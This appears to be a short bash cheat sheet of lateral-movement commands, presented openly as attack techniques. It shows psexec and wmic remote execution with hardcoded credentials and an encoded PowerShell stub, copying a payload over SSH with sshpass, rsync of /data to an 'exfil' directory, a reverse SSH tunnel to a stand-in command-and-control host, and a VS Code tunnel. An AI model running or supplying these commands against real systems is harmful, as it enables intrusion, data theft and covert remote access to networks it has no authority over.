#!/bin/bash
# Lateral movement techniques

# Windows lateral movement
psexec \\target-host -u admin -p password cmd.exe /c whoami
wmic /node:target-host process call create "cmd /c powershell -enc AAAA"

# SSH lateral movement
sshpass -p 'password' scp /tmp/payload admin@target:/tmp/
rsync -avz /data admin@10.0.0.5:/exfil/

# Remote shell via tunnel
ssh -R 8080:localhost:80 attacker@c2.example.com
code tunnel --accept-server-license-terms
